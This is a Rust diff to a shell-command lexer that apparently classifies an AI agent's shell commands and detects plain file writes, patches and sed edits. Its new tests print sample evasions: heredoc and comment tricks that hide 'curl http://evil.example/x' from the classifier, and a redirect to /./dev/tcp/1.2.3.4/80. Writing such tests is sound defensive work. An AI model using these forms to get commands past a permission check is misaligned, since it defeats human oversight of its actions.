@@ -25,6 +25,18 @@ pub struct ShellAnalysis {
 #[derive(Debug)]
 struct Simple {
     argv: Vec<String>,
+    /// `ops[i]`: `argv[i]` is an operator of the shell (a redirection, `<<`), not a word. A quoted `>`
+    /// is a word that looks the same.
+    ops: Vec<bool>,
+}
+
+/// The result of lexing, with what the lexer does not model.
+struct Lexed {
+    cmds: Vec<Simple>,
+    /// A comment, a group, a subshell or arithmetic, `${…}`, `$'…'`, `[[`: there the shell may read
+    /// `<<` as something else than a heredoc, or take a `#`-line out of the command.
+    suspicious: bool,
+    heredoc: bool,
 }
 
 const READ_ONLY: &[&str] = &[
@@ -76,20 +88,39 @@ const NET_PROGS: &[&str] = &[
 
 /// Split into simple commands; `None` when the command is not safely parseable.
 fn lex(cmd: &str) -> Option<Vec<Simple>> {
+    let l = lex_full(cmd)?;
+    // where `<<` is not a heredoc (in a comment, in arithmetic, in `${…}`) the lines that the lexer
+    // skips as a body are commands for the shell
+    (!(l.heredoc && l.suspicious)).then_some(l.cmds)
+}
+
+/// As [`lex`], for the callers that must be sure what the shell will run: nothing the lexer does
+/// not model may be in the command.
+fn lex_plain(cmd: &str) -> Option<Vec<Simple>> {
+    let l = lex_full(cmd)?;
+    (!l.suspicious).then_some(l.cmds)
+}
+
+fn lex_full(cmd: &str) -> Option<Lexed> {
     let chars: Vec<char> = cmd.chars().collect();
     let mut i = 0;
     let mut cmds: Vec<Simple> = vec![];
     let mut argv: Vec<String> = vec![];
+    let mut ops: Vec<bool> = vec![];
     let mut cur = String::new();
     let mut in_word = false;
+    let mut suspicious = false;
+    let mut heredoc = false;
     // heredocs announced on the current line: (delimiter, `<<-`, delimiter was quoted)
     let mut pending: Vec<(String, bool, bool)> = vec![];
-    let flush = |argv: &mut Vec<String>, cur: &mut String, in_word: &mut bool| {
-        if *in_word {
-            argv.push(std::mem::take(cur));
-            *in_word = false;
-        }
-    };
+    let flush =
+        |argv: &mut Vec<String>, ops: &mut Vec<bool>, cur: &mut String, in_word: &mut bool| {
+            if *in_word {
+                argv.push(std::mem::take(cur));
+                ops.push(false);
+                *in_word = false;
+            }
+        };
     while i < chars.len() {
         let c = chars[i];
         match c {
@@ -127,6 +158,8 @@ fn lex(cmd: &str) -> Option<Vec<Simple>> {
                     }
                 }
             }
+            // a backslash before a newline is a line continuation: both are gone
+            '\\' if chars.get(i + 1) == Some(&'\n') => i += 2,
             '\\' => {
                 in_word = true;
                 i += 1;
@@ -135,11 +168,19 @@ fn lex(cmd: &str) -> Option<Vec<Simple>> {
             }
             '`' => return None,
             '$' if chars.get(i + 1) == Some(&'(') => return None,
+            // `${…}`, `$'…'` and `$"…"` are read by the shell with rules of their own
+            '$' if matches!(chars.get(i + 1), Some('{' | '\'' | '"')) => {
+                suspicious = true;
+                in_word = true;
+                cur.push(c);
+                i += 1;
+            }
             '<' if chars[i..].starts_with(&['<', '<', '<']) => return None, // here-string
-            '<' if chars.get(i + 1) == Some(&'<') && chars.get(i + 2) != Some(&'<') => {
+            '<' if chars.get(i + 1) == Some(&'<') => {
                 // heredoc: the body is data for the command, never code of this shell, as long as
                 // nothing in it is expanded; here-strings (`<<<`) stay refused
-                flush(&mut argv, &mut cur, &mut in_word);
+                flush(&mut argv, &mut ops, &mut cur, &mut in_word);
+                heredoc = true;
                 i += 2;
                 let strip_tabs = chars.get(i) == Some(&'-');
                 if strip_tabs {
@@ -148,52 +189,63 @@ fn lex(cmd: &str) -> Option<Vec<Simple>> {
                 while matches!(chars.get(i), Some(' ' | '\t')) {
                     i += 1;
                 }
+                // the delimiter is one plain word, or one such word in single or double quotes with
+                // nothing glued to it: for anything else the shell and this lexer would not agree
+                // on where the body ends
+                let plain = |ch: char| ch.is_ascii_alphanumeric() || ch == '_';
                 let mut delim = String::new();
                 let mut quoted = false;
                 match chars.get(i) {
                     Some(&q @ ('\'' | '"')) => {
                         quoted = true;
                         i += 1;
-                        loop {
-                            let ch = *chars.get(i)?;
-                            i += 1;
+                        while let Some(&ch) = chars.get(i) {
                             if ch == q {
                                 break;
                             }
-                            delim.push(ch);
-                        }
-                    }
-                    _ => {
-                        while let Some(&ch) = chars.get(i) {
-                            if ch.is_whitespace()
-                                || matches!(ch, ';' | '|' | '&' | '<' | '>' | '(' | ')')
-                            {
-                                break;
-                            }
-                            if matches!(ch, '\\' | '\'' | '"' | '$' | '`') {
+                            if !plain(ch) {
                                 return None;
                             }
                             delim.push(ch);
                             i += 1;
                         }
+                        if chars.get(i) != Some(&q) {
+                            return None;
+                        }
+                        i += 1;
+                    }
+                    _ => {
+                        while let Some(&ch) = chars.get(i) {
+                            if !plain(ch) {
+                                break;
+                            }
+                            delim.push(ch);
+                            i += 1;
+                        }
                     }
                 }
-                if delim.is_empty() || delim.contains('\n') {
+                if delim.is_empty()
+                    || !matches!(
+                        chars.get(i),
+                        None | Some(' ' | '\t' | '\n' | ';' | '|' | '&' | '<' | '>')
+                    )
+                {
                     return None;
                 }
-                // what follows on this line is lexed as usual; it must not hide a newline
                 argv.push("<<".to_string());
+                ops.push(true);
                 argv.push(delim.clone());
+                ops.push(false);
                 pending.push((delim, strip_tabs, quoted));
             }
             '<' if chars.get(i + 1) == Some(&'(') => return None,
             '>' if chars.get(i + 1) == Some(&'(') => return None,
             ' ' | '\t' => {
-                flush(&mut argv, &mut cur, &mut in_word);
+                flush(&mut argv, &mut ops, &mut cur, &mut in_word);
                 i += 1;
             }
             '\n' | ';' | '|' | '&' => {
-                flush(&mut argv, &mut cur, &mut in_word);
+                flush(&mut argv, &mut ops, &mut cur, &mut in_word);
                 // consume doubled operator
                 if matches!(c, '|' | '&') && chars.get(i + 1) == Some(&c) {
                     i += 1;
@@ -202,6 +254,7 @@ fn lex(cmd: &str) -> Option<Vec<Simple>> {
                 if !argv.is_empty() {
                     cmds.push(Simple {
                         argv: std::mem::take(&mut argv),
+                        ops: std::mem::take(&mut ops),
                     });
                 }
                 if c == '\n' {
@@ -234,15 +287,51 @@ fn lex(cmd: &str) -> Option<Vec<Simple>> {
                 }
             }
             '>' | '<' => {
-                // redirection: keep the operator and target as arguments of the command
-                flush(&mut argv, &mut cur, &mut in_word);
-                let mut op = String::from(c);
+                // redirection: keep the operator and target as arguments of the command; digits
+                // glued to the operator name a file descriptor (`2>file`), part of the operator
+                let mut op =
+                    if in_word && !cur.is_empty() && cur.chars().all(|d| d.is_ascii_digit()) {
+                        in_word = false;
+                        std::mem::take(&mut cur)
+                    } else {
+                        flush(&mut argv, &mut ops, &mut cur, &mut in_word);
+                        String::new()
+                    };
+                op.push(c);
                 i += 1;
                 while chars.get(i) == Some(&c) || chars.get(i) == Some(&'&') {
                     op.push(chars[i]);
                     i += 1;
                 }
                 argv.push(op);
+                ops.push(true);
+            }
+            // a comment runs to the end of the line, and a backslash in it means nothing: the line
+            // after `# \` is a command (as a word of this line it would hide from the classifier)
+            '#' if !in_word => {
+                suspicious = true;
+                while i < chars.len() && chars[i] != '\n' {
+                    i += 1;
+                }
+            }
+            // a subshell or arithmetic, a group, `[[`
+            '(' | ')' => {
+                suspicious = true;
+                in_word = true;
+                cur.push(c);
+                i += 1;
+            }
+            '{' | '}' if !in_word => {
+                suspicious = true;
+                in_word = true;
+                cur.push(c);
+                i += 1;
+            }
+            '[' if !in_word && chars.get(i + 1) == Some(&'[') => {
+                suspicious = true;
+                in_word = true;
+                cur.push(c);
+                i += 1;
             }
             _ => {
                 in_word = true;
@@ -251,14 +340,18 @@ fn lex(cmd: &str) -> Option<Vec<Simple>> {
             }
         }
     }
-    flush(&mut argv, &mut cur, &mut in_word);
+    flush(&mut argv, &mut ops, &mut cur, &mut in_word);
     if !argv.is_empty() {
-        cmds.push(Simple { argv });
+        cmds.push(Simple { argv, ops });
     }
     if !pending.is_empty() {
         return None; // a heredoc without a body
     }
-    Some(cmds)
+    Some(Lexed {
+        cmds,
+        suspicious,
+        heredoc,
+    })
 }
 
 fn is_assignment(w: &str) -> bool {
@@ -734,18 +827,34 @@ pub fn analyze(cmd: &str) -> ShellAnalysis {
     }
 }
 
+/// The programs of the commands of `cmd` as the lexer reads them. A test compares it with a real
+/// shell: every program the shell starts must be in the list, or the lexer has hidden a command.
+#[doc(hidden)]
+pub fn lexed_programs(cmd: &str) -> Option<Vec<String>> {
+    lex(cmd).map(|cmds| {
+        cmds.iter()
+            // a redirection in front of the program (`>f ls`, `2>f ls`): the lexer takes the operator
+            // for the program, which no list knows, so the command counts as a network one
+            .filter_map(|c| match c.ops.first() {
+                Some(true) => Some("$operator".to_string()),
+                _ => program(&c.argv).map(|(p, _)| p),
+            })
+            .collect()
+    })
+}
+
 /// The file that a command writes, when writing a file is all it does: `cat > f <<'EOF'`,
 /// `cat >> f <<'EOF'`, `tee [-a] f <<'EOF'`, `echo|printf words > f`. One simple command, text given in
 /// the command (a heredoc or literal words), one literal path. Anything else (a pipe, a second
-/// command, a variable, a glob, `..`, a device, an input file, another redirection) is not a plain file
-/// write: it stays a shell command. The caller judges such a command as a write of that file, the way
-/// it judges the `Write` tool or `apply_patch`.
+/// command, a variable, a glob, `..`, a device, an input file, another redirection, a comment, a
+/// quoted `>`) is not a plain file write: it stays a shell command. The caller judges such a command
+/// as a write of that file, the way it judges the `Write` tool or `apply_patch`.
 pub fn file_write_target(cmd: &str) -> Option<String> {
-    let cmds = lex(cmd)?;
+    let cmds = lex_plain(cmd)?;
     let [one] = cmds.as_slice() else { return None };
-    let argv = &one.argv;
-    let prog = argv.first()?;
-    let args = &argv[1..];
+    // the program is a bare word: no path, no assignment, no operator
+    let prog = one.argv.first().filter(|_| !one.ops[0])?;
+    let (args, is_op) = (&one.argv[1..], &one.ops[1..]);
     let mut target: Option<&String> = None;
     let mut heredocs = 0;
     let mut i = 0;
@@ -753,20 +862,22 @@ pub fn file_write_target(cmd: &str) -> Option<String> {
         "cat" | "echo" | "printf" => {
             let text_cmd = prog != "cat";
             while i < args.len() {
-                match args[i].as_str() {
-                    ">" | ">>" => {
-                        if target.is_some() {
-                            return None;
+                if is_op[i] {
+                    match args[i].as_str() {
+                        ">" | ">>" if target.is_none() && is_op.get(i + 1) == Some(&false) => {
+                            target = Some(&args[i + 1]);
+                            i += 2;
                         }
-                        target = Some(args.get(i + 1)?);
-                        i += 2;
+                        "<<" if is_op.get(i + 1) == Some(&false) => {
+                            heredocs += 1;
+                            i += 2; // the delimiter
+                        }
+                        _ => return None,
                     }
-                    "<<" => {
-                        heredocs += 1;
-                        i += 2; // the delimiter
-                    }
-                    a if text_cmd && !a.starts_with(['<', '>']) && !a.contains('$') => i += 1,
-                    _ => return None,
+                } else if text_cmd && !args[i].contains('$') {
+                    i += 1;
+                } else {
+                    return None;
                 }
             }
             // `cat` has its text in a heredoc; `echo` and `printf` in their words
@@ -776,17 +887,20 @@ pub fn file_write_target(cmd: &str) -> Option<String> {
         }
         "tee" => {
             while i < args.len() {
-                match args[i].as_str() {
-                    "-a" | "--append" if target.is_none() => i += 1,
-                    "<<" => {
+                if is_op[i] {
+                    if args[i] == "<<" && is_op.get(i + 1) == Some(&false) {
                         heredocs += 1;
                         i += 2;
+                    } else {
+                        return None;
                     }
-                    a if !a.starts_with(['-', '<', '>']) && target.is_none() => {
-                        target = Some(&args[i]);
-                        i += 1;
-                    }
-                    _ => return None,
+                } else if matches!(args[i].as_str(), "-a" | "--append") && target.is_none() {
+                    i += 1;
+                } else if !args[i].starts_with('-') && target.is_none() {
+                    target = Some(&args[i]);
+                    i += 1;
+                } else {
+                    return None;
                 }
             }
             if heredocs != 1 {
@@ -803,19 +917,32 @@ pub fn file_write_target(cmd: &str) -> Option<String> {
 /// tool through the shell. One simple command and one heredoc, nothing else: a second command, a pipe,
 /// an argument or a redirection make it an ordinary shell command.
 pub fn heredoc_patch(cmd: &str) -> Option<String> {
-    let cmds = lex(cmd)?;
+    let cmds = lex_plain(cmd)?;
     let [one] = cmds.as_slice() else { return None };
     let [prog, op, delim] = one.argv.as_slice() else {
         return None;
     };
-    if !matches!(prog.as_str(), "apply_patch" | "applypatch") || op != "<<" {
+    if one.ops != [false, true, false]
+        || !matches!(prog.as_str(), "apply_patch" | "applypatch")
+        || op != "<<"
+    {
         return None;
     }
-    // `lex` checked that the heredoc has its terminator and that nothing follows it
-    let body_start = cmd.find('\n')? + 1;
-    let strip_tabs = cmd[..body_start].contains("<<-");
+    // the header line is exactly `prog <<[-]DELIM` (the delimiter may be quoted) and the body is
+    // what follows it: the lexer checked that the heredoc has its terminator and nothing follows it
+    let nl = cmd.find('\n')?;
+    let header = cmd[..nl].strip_prefix(prog.as_str())?;
+    let header = header.trim_start_matches([' ', '\t']).strip_prefix("<<")?;
+    let (strip_tabs, header) = match header.strip_prefix('-') {
+        Some(h) => (true, h),
+        None => (false, header),
+    };
+    let token = header.trim_matches([' ', '\t']);
+    if ![delim.clone(), format!("'{delim}'"), format!("\"{delim}\"")].contains(&token.to_string()) {
+        return None;
+    }
     let mut body = String::new();
-    for line in cmd[body_start..].split('\n') {
+    for line in cmd[nl + 1..].split('\n') {
         let cmp = if strip_tabs {
             line.trim_start_matches('\t')
         } else {
@@ -834,25 +961,31 @@ pub fn heredoc_patch(cmd: &str) -> Option<String> {
 /// literal substitution on one file. A script other than a single `s` command, a flag that runs a
 /// command or writes a file (`e`, `w`), several files and a pipe are an ordinary shell command.
 pub fn sed_inplace_target(cmd: &str) -> Option<String> {
-    let cmds = lex(cmd)?;
+    let cmds = lex_plain(cmd)?;
     let [one] = cmds.as_slice() else { return None };
-    let (prog, args) = program(&one.argv)?;
-    if prog != "sed" || one.argv.first().is_some_and(|w| is_assignment(w)) {
+    // `sed` itself, not a program of that name in some directory; no operator at all
+    if one.argv.first().map(String::as_str) != Some("sed") || one.ops.iter().any(|o| *o) {
         return None;
     }
     let mut script: Option<&String> = None;
     let mut file: Option<&String> = None;
     let mut in_place = false;
-    for a in args {
+    // the suffix of the backup copy is a plain name: it must not name a directory or a pattern
+    let suffix_ok = |s: &str| {
+        s.chars()
+            .all(|c| c.is_ascii_alphanumeric() || "._~".contains(c))
+    };
+    for a in &one.argv[1..] {
         match a.as_str() {
             "-i" | "--in-place" => in_place = true,
             "-E" | "-r" | "--regexp-extended" => {}
-            // `-i.bak`: a suffix for the backup copy
-            s if s.starts_with("-i") && s.len() <= 12 && !s[2..].contains(['-', '/', ' ']) => {
+            s if s.starts_with("--in-place=") && suffix_ok(&s["--in-place=".len()..]) => {
                 in_place = true
             }
-            s if s.starts_with("--in-place=") => in_place = true,
-            s if s.starts_with('-') || s.starts_with(['<', '>']) => return None,
+            s if s.starts_with("-i") && !s.starts_with("--") && suffix_ok(&s[2..]) => {
+                in_place = true
+            }
+            s if s.starts_with('-') => return None,
             _ if script.is_none() => script = Some(a),
             _ if file.is_none() => file = Some(a),
             _ => return None,
@@ -893,17 +1026,23 @@ fn sed_script_is_a_substitution(script: &str) -> bool {
 }
 
 fn plain_path(t: &str) -> bool {
+    // `a//b`, `a/./b` and `./x` name what `a/b` and `x` name: the checks below look at one spelling
+    let rest = t.strip_prefix("./").unwrap_or(t);
     !(t.is_empty()
         || t.starts_with(['-', '~'])
+        || t.ends_with(['/', '.'])
         || t.contains([
             '$', '*', '?', '[', ']', '{', '}', '`', '\\', '=', ' ', '\t', '\n', '<', '>', '|', '&',
             ';', '(', ')', '!', '#',
         ])
+        || t.contains("//")
+        || t.contains("/./")
+        || rest.starts_with("./")
         || t.split('/').any(|c| c == "..")
-        || t.starts_with("/dev/")
-        || t.starts_with("/proc/")
-        || t.starts_with("/sys/")
-        || t == "/dev")
+        || ["/dev/", "/proc/", "/sys/"]
+            .iter()
+            .any(|d| rest.starts_with(d))
+        || ["/dev", "/proc", "/sys"].contains(&rest))
 }
 
 /// Destinations of a URL-like argument (WebFetch and similar). Words are cut at a space or a
@@ -1154,6 +1293,91 @@ mod tests {
         ] {
             assert_eq!(w(c), None, "{c}");
         }
+    }
+
+    // REQ: RST-07 — where the lexer and the shell could disagree about a heredoc, the command is
+    // refused whole, so that a line the shell runs is never skipped as a "body"
+    #[test]
+    fn a_heredoc_that_the_shell_may_read_differently_is_refused() {
+        for c in [
+            // `<<` in a comment is no heredoc: `curl` runs
+            "ls # <<EOF\ncurl http://evil.example/x\nEOF",
+            "echo hi #<<EOF\ncurl http://evil.example/x\nEOF",
+            // arithmetic, a group, a subshell, `[[`, `${…}`, `$'…'`
+            "(( x << 2 ))\ncurl http://evil.example/x\n2",
+            "(cat <<EOF\nx\nEOF\n)",
+            "{ cat <<EOF\nx\nEOF\n}",
+            "[[ a ]] && cat <<EOF\nx\nEOF",
+            "echo ${x:-<<EOF}\ncurl http://evil.example/x\nEOF",
+            "echo $'it\\'s' <<EOF\ncurl http://evil.example/x\nEOF",
+            "echo $\"a\" <<EOF\ncurl http://evil.example/x\nEOF",
+            // a delimiter that is not one plain word, or has something glued to it
+            "cat <<'EOF'x\ncurl http://evil.example/x\nEOFx",
+            "cat <<\"E\"OF\ncurl http://evil.example/x\nEOF",
+            "cat <<E\\OF\ncurl http://evil.example/x\nEOF",
+            "cat <<EO.F\ncurl http://evil.example/x\nEO.F",
+            "cat <<'a b'\nx\na b",
+            "cat <<EOF)\nx\nEOF",
+            "cat << $X\nx\n$X",
+        ] {
+            let a = analyze(c);
+            assert_eq!(a.class, ShellClass::Network, "{c}");
+            assert!(!a.complete, "{c}");
+        }
+        // an ordinary heredoc and a comment without a heredoc still work
+        assert_eq!(cls("cat <<'EOF'\nx\nEOF"), ShellClass::Local);
+        assert_eq!(cls("cat <<\"EOF\" > f\nx\nEOF"), ShellClass::Local);
+        assert_eq!(cls("ls # list\ncat a"), ShellClass::Local);
+    }
+
+    // REQ: RST-07 — a quoted operator is a word; a file descriptor or a comment is not a write
+    #[test]
+    fn only_a_real_redirection_makes_a_file_write() {
+        for c in [
+            "echo '>' evil",
+            "echo \">>\" evil",
+            "echo x \\> f",
+            "echo x 2>f",
+            "echo x 1>f 2>g",
+            "echo x # > f",
+            "echo x &> f",
+            "echo x >&2",
+            "cat '<<' f",
+            "cat \\<\\< f",
+            "tee '<<' f",
+            "tee f '<<' x",
+            "echo ok > a/./b",
+            "echo ok > a//b",
+            "echo ok > //dev/null",
+            "echo ok > /./dev/tcp/1.2.3.4/80",
+            "echo ok > d/",
+        ] {
+            assert_eq!(file_write_target(c), None, "{c}");
+        }
+        assert_eq!(heredoc_patch("apply_patch '<<' 'x'"), None);
+        assert_eq!(heredoc_patch("\napply_patch <<'P'\nx\nP"), None);
+        assert_eq!(
+            heredoc_patch("apply_patch <<'P' \nx\nP").as_deref(),
+            Some("x\n")
+        );
+        // `sed`: itself and a plain suffix
+        for c in [
+            "./sed -i 's/a/b/' f",
+            "/bin/sed -i 's/a/b/' f",
+            "sed --in-place=bak/ 's/a/b/' f",
+            "sed --in-place=* 's/a/b/' f",
+            "sed -i../x 's/a/b/' f",
+            "sed -i$X 's/a/b/' f",
+            "sed -i 's/a/b/' f > g",
+            "sed -i 's/a/b/' f # x",
+            "sed -i 's/a/b/' '>'",
+        ] {
+            assert_eq!(sed_inplace_target(c), None, "{c}");
+        }
+        assert_eq!(
+            sed_inplace_target("sed -i.bak 's/a/b/' f").as_deref(),
+            Some("f")
+        );
     }
 
     #[test]
